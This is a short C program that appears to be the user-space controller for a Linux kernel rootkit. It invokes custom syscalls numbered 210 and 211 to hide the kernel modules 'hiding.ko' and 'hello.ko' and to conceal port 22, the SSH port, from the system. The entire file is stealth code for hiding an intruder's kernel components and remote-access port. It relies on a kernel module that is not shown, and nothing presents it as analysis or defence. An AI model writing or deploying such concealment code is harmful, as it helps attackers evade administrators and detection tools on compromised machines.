#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdlib.h>

#define SYS_hide_module 210
#define SYS_hide_port 211

int main(void) {
    syscall(SYS_hide_module, "hiding.ko");
    syscall(SYS_hide_module, "hello.ko");
    syscall(SYS_hide_port, 22);

    return 0;
}